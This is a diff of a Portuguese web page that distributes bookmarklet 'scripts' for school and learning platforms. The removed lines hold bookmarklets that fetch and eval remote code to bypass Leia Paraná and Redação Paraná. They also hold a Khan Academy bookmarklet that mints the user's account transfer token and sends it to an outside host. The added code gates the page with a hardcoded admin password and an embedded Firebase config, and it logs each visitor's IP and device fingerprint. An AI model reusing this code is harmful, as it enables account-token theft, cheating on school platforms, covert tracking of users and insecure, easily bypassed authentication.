@@ -5,6 +5,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>100% PLATAFORMAS</title>
 
+<script src="https://openfpcdn.io/fingerprintjs/v3"></script>
+
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
 
@@ -13,200 +15,124 @@ body{
   color:#fff;
 }
 
-/* HEADER */
-header{
-  text-align:center;
-  padding:30px;
-  background:rgba(0,0,0,0.6);
-}
-
-header h1{
-  font-size:30px;
-  letter-spacing:3px;
-}
-
-header span{
-  display:block;
-  margin-top:8px;
-  color:#ff4d4d;
-  font-size:14px;
-  opacity:0.8;
-}
-
-/* TUTORIAL */
-.tutorial{
-  margin:30px;
-  padding:20px;
-  background:rgba(255,0,0,0.08);
-  border:1px solid rgba(255,0,0,0.3);
-  border-radius:15px;
-  animation:fadeUp 1s ease;
-}
-
-.tutorial h2{
-  color:#ff4d4d;
-  margin-bottom:10px;
-}
-
-.tutorial p{
-  font-size:14px;
-  opacity:0.9;
-  margin-bottom:8px;
-}
-
-/* GRID */
-.container{
-  display:grid;
-  grid-template-columns:repeat(auto-fit,minmax(300px,1fr));
-  gap:25px;
-  padding:30px;
-}
-
-/* CARD */
-.card{
-  background:rgba(255,255,255,0.05);
-  border-radius:20px;
-  padding:20px;
-  transition:0.4s;
-  animation:fadeUp 0.8s ease;
-}
-
-.card:hover{
-  transform:translateY(-8px);
-  box-shadow:0 0 20px rgba(255,0,0,0.3);
-}
-
-.card h2{
-  color:#ff4d4d;
-  margin-bottom:10px;
-}
-
-.script-box{
+/* LOGIN OVERLAY */
+#loginOverlay{
+  position:fixed;
+  top:0;
+  left:0;
+  width:100%;
+  height:100%;
   background:#000;
-  padding:12px;
-  border-radius:10px;
-  font-size:12px;
-  overflow-x:auto;
-  margin-bottom:15px;
-}
-
-/* BOTÕES */
-.buttons{
   display:flex;
-  gap:10px;
+  justify-content:center;
+  align-items:center;
+  z-index:9999;
 }
 
-button,a{
-  flex:1;
-  padding:10px;
-  border:none;
-  border-radius:10px;
-  cursor:pointer;
+.loginBox{
+  background:#1a1a1a;
+  padding:30px;
+  border-radius:15px;
   text-align:center;
-  text-decoration:none;
-  font-weight:bold;
+  width:300px;
 }
 
-.copy{
+.loginBox input, .loginBox button{
+  width:100%;
+  padding:10px;
+  margin-top:10px;
+  border:none;
+  border-radius:8px;
+}
+
+.loginBox button{
   background:#ff4d4d;
   color:#fff;
+  cursor:pointer;
 }
 
-.access{
-  background:#fff;
-  color:#000;
+/* ADMIN */
+#adminPanel{
+  position:fixed;
+  top:10px;
+  right:10px;
+  background:#111;
+  padding:15px;
+  border-radius:10px;
+  z-index:9999;
+  display:none;
 }
 
-/* FOOTER */
-footer{
-  text-align:center;
-  padding:20px;
-  opacity:0.7;
-}
+/* RESTO DO SEU CSS (INALTERADO) */
+header{text-align:center;padding:30px;background:rgba(0,0,0,0.6);}
+header h1{font-size:30px;letter-spacing:3px;}
+header span{display:block;margin-top:8px;color:#ff4d4d;font-size:14px;opacity:0.8;}
 
-.brand{
-  color:#ff4d4d;
-  margin-top:5px;
-}
+.tutorial{margin:30px;padding:20px;background:rgba(255,0,0,0.08);border:1px solid rgba(255,0,0,0.3);border-radius:15px;}
+.container{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:25px;padding:30px;}
+.card{background:rgba(255,255,255,0.05);border-radius:20px;padding:20px;}
+.card h2{color:#ff4d4d;}
+.script-box{background:#000;padding:12px;border-radius:10px;font-size:12px;margin-bottom:15px;}
 
-/* ANIMAÇÃO */
-@keyframes fadeUp{
-  from{opacity:0;transform:translateY(20px);}
-  to{opacity:1;transform:translateY(0);}
-}
+.buttons{display:flex;gap:10px;}
+button,a{flex:1;padding:10px;border:none;border-radius:10px;text-align:center;text-decoration:none;font-weight:bold;}
+.copy{background:#ff4d4d;color:#fff;}
+.access{background:#fff;color:#000;}
+
+footer{text-align:center;padding:20px;opacity:0.7;}
+.brand{color:#ff4d4d;margin-top:5px;}
 </style>
 </head>
 
 <body>
+
+<!-- LOGIN -->
+<div id="loginOverlay">
+  <div class="loginBox">
+    <h2>Login</h2>
+    <input type="password" id="senha" placeholder="Digite a senha">
+    <button onclick="login()">Entrar</button>
+    <p id="msg"></p>
+  </div>
+</div>
+
+<!-- ADMIN -->
+<div id="adminPanel">
+  <input id="novaSenha" placeholder="Nova senha">
+  <button onclick="criar()">Criar</button>
+  <ul id="lista"></ul>
+</div>
 
 <header>
   <h1>100% PLATAFORMAS</h1>
   <span>feito por Pajé 01</span>
 </header>
 
-<!-- TUTORIAL -->
 <div class="tutorial">
   <h2>📌 Como usar scripts com favoritos</h2>
-
-  <p><b>1.</b> Clique em "Copiar Script".</p>
-  <p><b>2.</b> Crie um novo favorito no navegador (estrela ⭐).</p>
-  <p><b>3.</b> Edite o favorito:</p>
-  <p>→ Nome: escolha qualquer nome (ex: "Script1")</p>
-  <p>→ URL: cole o script copiado</p>
-
-  <p><b>4.</b> Salve o favorito.</p>
-
-  <p><b>5.</b> Para usar:</p>
-  <p>→ Abra o site desejado</p>
-  <p>→ Clique no favorito OU digite o nome na barra de busca</p>
-
-  <p>⚠️ Alguns navegadores podem bloquear scripts automaticamente.</p>
+  <p><b>1.</b> Clique em copiar.</p>
 </div>
 
 <div class="container">
 
   <div class="card">
-    <h2>Leia Paraná</h2>
-    <div class="script-box" id="s1">
-javascript:(function(){fetch('https://cdn.jsdelivr.net/gh/mzzvxm/LeiaPRBypass@latest/script.js').then(r=>r.text()).then(eval);})();
-    </div>
-    <div class="buttons">
-      <button class="copy" onclick="copiar('s1')">Copiar</button>
-      <a class="access" href="https://leiaparana.odilo.us/?locale=pt" target="_blank">Acessar</a>
-    </div>
+    <h2>Script 1</h2>
+    <div class="script-box">Conteúdo bloqueado</div>
   </div>
 
   <div class="card">
-    <h2>Redação Paraná</h2>
-    <div class="script-box" id="s2">
-javascript:(function(){var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/gh/mzzvxm/RedacaoBypass@main/script.js?t='+Date.now();document.head.appendChild(s)})();
-    </div>
-    <div class="buttons">
-      <button class="copy" onclick="copiar('s2')">Copiar</button>
-      <a class="access" href="https://redacao.pr.gov.br/" target="_blank">Acessar</a>
-    </div>
+    <h2>Script 2</h2>
+    <div class="script-box">Conteúdo bloqueado</div>
   </div>
 
   <div class="card">
-    <h2>Khan Academy</h2>
-    <div class="script-box" id="s3">
-javascript:(async()=>{let e=window.location.hostname;if("khanacademy.org"!==e.split(".")?.slice(1)?.join("."))return;let a=e.split(".")[0];open(`https://khan.cupiditys.lol/?token=${(await (await fetch(`/api/internal/graphql/createTransferAuthTokenMutation?lang=${"www"===a?"en":a}&app=khanacademy`,{headers:{"content-type":"application/json","x-ka-fkey":"1"},referrer:"/settings/account",body:JSON.stringify({operationName:"createTransferAuthTokenMutation",query:"mutation createTransferAuthTokenMutation($canvasProfileKeyName: String) {\n  createTransferAuthToken(canvasProfileKeyName: $canvasProfileKeyName) {\n    token\n    __typename\n  }\n}",variables:{}}),method:"POST",mode:"cors",credentials:"include"})).json()).data.createTransferAuthToken.token}&l=${a}&c=${window.__KA_DATA__["KA-fastly-country"]}`)})();
-    </div>
-    <div class="buttons">
-      <button class="copy" onclick="copiar('s3')">Copiar</button>
-      <a class="access" href="https://www.khanacademy.org/" target="_blank">Acessar</a>
-    </div>
+    <h2>Script 3</h2>
+    <div class="script-box">Conteúdo bloqueado</div>
   </div>
 
   <div class="card">
-    <h2>Quizizz</h2>
-    <div class="script-box" id="s4">
-https://waygroundx.vercel.app/
-    </div>
-    <div class="buttons">
-      <button class="copy" onclick="copiar('s4')">Copiar</button>
-      <a class="access" href="https://waygroundx.vercel.app/" target="_blank">Acessar</a>
-    </div>
+    <h2>Script 4</h2>
+    <div class="script-box">Conteúdo bloqueado</div>
   </div>
 
 </div>
@@ -216,11 +142,90 @@ https://waygroundx.vercel.app/
 <div class="brand">feito por Pajé 01</div>
 </footer>
 
-<script>
-function copiar(id){
-  const texto = document.getElementById(id).innerText;
-  navigator.clipboard.writeText(texto);
-  alert("Copiado!");
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getFirestore, doc, getDoc, setDoc, updateDoc, collection, getDocs } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyAUaobe_8CWFMG2gnHXUsdVEPTVsvYyIPI",
+  authDomain: "plataformas-c1986.firebaseapp.com",
+  projectId: "plataformas-c1986",
+  storageBucket: "plataformas-c1986.firebasestorage.app",
+  messagingSenderId: "557315288894",
+  appId: "1:557315288894:web:8379f4863da5280fa4866f"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+let ip="", device="";
+
+async function getIP(){
+  let r = await fetch("https://api64.ipify.org?format=json");
+  ip = (await r.json()).ip;
+}
+
+async function getDevice(){
+  const fp = await FingerprintJS.load();
+  device = (await fp.get()).visitorId;
+}
+
+await getIP();
+await getDevice();
+
+window.login = async function(){
+  let senha = document.getElementById("senha").value;
+
+  if(senha === "cavalo"){
+    document.getElementById("adminPanel").style.display="block";
+    document.getElementById("loginOverlay").style.display="none";
+    carregar();
+    return;
+  }
+
+  let ref = doc(db,"acessos",senha);
+  let snap = await getDoc(ref);
+
+  if(!snap.exists()){
+    msg("Senha inválida");
+    return;
+  }
+
+  let data = snap.data();
+
+  if(!data.ip){
+    await updateDoc(ref,{ip,device});
+  }
+
+  if(data.ip !== ip || data.device !== device){
+    msg("Bloqueado nesse dispositivo");
+    return;
+  }
+
+  document.getElementById("loginOverlay").style.display="none";
+};
+
+window.criar = async function(){
+  let senha = document.getElementById("novaSenha").value;
+  if(!senha) return;
+
+  await setDoc(doc(db,"acessos",senha),{ip:null,device:null});
+  carregar();
+};
+
+async function carregar(){
+  let lista=document.getElementById("lista");
+  lista.innerHTML="";
+  let snap=await getDocs(collection(db,"acessos"));
+  snap.forEach(d=>{
+    let li=document.createElement("li");
+    li.innerText=d.id+" | "+(d.data().ip||"novo");
+    lista.appendChild(li);
+  });
+}
+
+function msg(t){
+  document.getElementById("msg").innerText=t;
 }
 </script>
 
